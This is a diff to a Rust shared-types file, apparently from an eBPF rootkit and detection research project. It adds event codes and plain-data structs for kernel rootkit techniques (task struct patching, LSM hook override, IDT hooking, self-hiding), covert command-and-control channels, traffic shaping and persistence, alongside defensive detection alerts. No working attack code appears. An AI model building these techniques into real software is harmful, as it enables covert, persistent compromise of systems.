@@ -217,6 +217,25 @@ pub const EVENT_BPF_PROG_DETECTED: u32 = 73;
 pub const EVENT_TAILCALL_INJECTED: u32 = 74;
 pub const EVENT_PROG_ARRAY_HIJACKED: u32 = 75;
 
+// Advanced rootkit technique events
+pub const EVENT_TASK_STRUCT_PATCHED: u32 = 76;
+pub const EVENT_LSM_HOOK_SUBVERTED: u32 = 77;
+pub const EVENT_IDT_HOOKED: u32 = 78;
+pub const EVENT_FTRACE_SELF_HIDDEN: u32 = 79;
+pub const EVENT_LIVEPATCH_ABUSED: u32 = 80;
+
+// Network stealth layer events
+pub const EVENT_RAW_SOCKET_C2: u32 = 81;
+pub const EVENT_TC_TRAFFIC_INJECTED: u32 = 82;
+pub const EVENT_DOH_C2_ESTABLISHED: u32 = 83;
+pub const EVENT_TRAFFIC_SHAPED: u32 = 84;
+
+// Advanced persistence events (category 4)
+pub const EVENT_OBFUSCATED_PIN: u32 = 85;
+pub const EVENT_CGROUP_PERSIST: u32 = 86;
+pub const EVENT_MODULE_PARAM_INJECT: u32 = 87;
+pub const EVENT_INITRAMFS_LOADER: u32 = 88;
+
 // Defense event types (100+)
 pub const EVENT_GHOST_MAP_FOUND: u32 = 100;
 pub const EVENT_LATENCY_ANOMALY: u32 = 101;
@@ -313,6 +332,12 @@ pub const ALERT_TRACEPOINT_GAP: u32 = 11;
 pub const ALERT_AUTO_DETACH: u32 = 12;
 pub const ALERT_CONTAINMENT: u32 = 13;
 pub const ALERT_HONEYPOT_READ: u32 = 14;
+
+// Anti-detection research alerts
+pub const ALERT_CROSS_REFERENCE: u32 = 15;
+pub const ALERT_HW_PERF_COUNTER: u32 = 16;
+pub const ALERT_VERIFIER_ANALYSIS: u32 = 17;
+pub const ALERT_MEMORY_FORENSICS: u32 = 18;
 
 /// Minimum interval between alerts per-CPU in nanoseconds.
 /// Default: 100ms = 100_000_000ns.
@@ -535,6 +560,66 @@ pub struct SupplyChainTarget {
     pub patch_len: u32,
 }
 
+/// Task struct patch record for kernel object manipulation.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct TaskPatchRecord {
+    pub target_pid: u32,
+    pub field_offset: u32,
+    pub original_value: u64,
+    pub patched_value: u64,
+}
+
+/// LSM hook override entry.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct LsmOverrideEntry {
+    pub hook_id: u32,
+    pub target_pid: u32,
+    pub decision: u32,
+    pub _pad: u32,
+}
+
+/// Traffic shaping profile for mimicking normal patterns.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct TrafficProfile {
+    pub avg_interval_ns: u64,
+    pub jitter_ns: u64,
+    pub max_burst_bytes: u32,
+    pub bytes_this_window: u32,
+}
+
+/// Cross-reference anomaly (defense).
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct CrossRefAnomaly {
+    pub proc_pid_count: u32,
+    pub bpf_map_pid_count: u32,
+    pub discrepancy: u32,
+    pub _pad: u32,
+    pub timestamp_ns: u64,
+}
+
+/// Hardware performance counter sample (defense).
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct PerfCounterSample {
+    pub instruction_count: u64,
+    pub cache_miss_count: u64,
+    pub branch_miss_count: u64,
+    pub expected_ratio: u64,
+}
+
+/// Persistence state record.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct PersistenceRecord {
+    pub method: u32,
+    pub status: u32,
+    pub path_hash: u64,
+}
+
 // ──────────────────────────────────────────────
 // Safety: All structs above are plain-old-data (POD) types.
 // They contain no pointers, no references, and no Drop impls.
@@ -624,3 +709,21 @@ unsafe impl aya::Pod for DetectedBpfProg {}
 
 #[cfg(feature = "user")]
 unsafe impl aya::Pod for SupplyChainTarget {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for TaskPatchRecord {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for LsmOverrideEntry {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for TrafficProfile {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for CrossRefAnomaly {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for PerfCounterSample {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for PersistenceRecord {}
